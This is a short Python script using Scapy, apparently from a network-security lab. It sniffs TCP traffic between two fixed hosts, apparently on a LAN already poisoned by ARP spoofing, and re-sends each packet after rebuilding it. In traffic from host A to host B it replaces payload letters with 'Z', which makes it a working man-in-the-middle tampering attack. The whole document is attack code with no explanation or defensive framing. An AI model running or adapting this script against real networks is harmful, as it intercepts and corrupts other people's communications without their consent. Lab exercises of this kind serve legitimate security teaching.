from scapy.all import *
IP_A = '10.9.0.5'
MAC_A = '02:42:0a:09:00:05'
IP_B = '10.9.0.6'
MAC_B = '02:42:0a:09:00:06'

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            data=data.decode()
            new = list(data)
            index = 0
            for i in new:
                if (i >= chr(65) and i <= chr(90)) or (i >= chr(97) and i <= chr(122)):
                    new[index] = 'Z'
                    index += 1
            newdata=''.join(new)
            send(newpkt/newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)
f = 'tcp && not ether src 02:42:0a:09:00:69 && (src 10.9.0.5 || src 10.9.0.6)'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)